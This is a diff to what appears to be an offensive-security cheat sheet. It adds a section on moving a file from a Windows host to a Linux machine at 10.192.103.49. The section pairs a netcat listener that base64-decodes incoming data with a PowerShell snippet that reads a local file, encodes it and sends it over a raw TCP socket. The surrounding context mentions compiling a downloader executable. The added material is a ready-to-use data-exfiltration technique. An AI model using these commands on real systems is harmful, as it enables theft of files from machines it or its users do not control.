@@ -1054,3 +1054,20 @@ Compile the program.
 `c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:c:\folder\dl.exe c:\folder\dl.cs`
 
 Execute `dl.exe` to retrieve the file.
+
+## >> Uploading a file via powershell
+
+Start netcat listener on Linux (10.192.103.49).<br />
+`nc -nlvp 4444 | base64 -di > file.bin`
+
+Send the file from Windows host using powershell.<br />
+```powershell
+$fdata=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("c:\path\file.bin"));
+$socket = New-Object net.sockets.tcpclient('10.192.103.49', 4444);
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$writer.WriteLine($fdata);
+$writer.flush();
+$socket.close();
+```
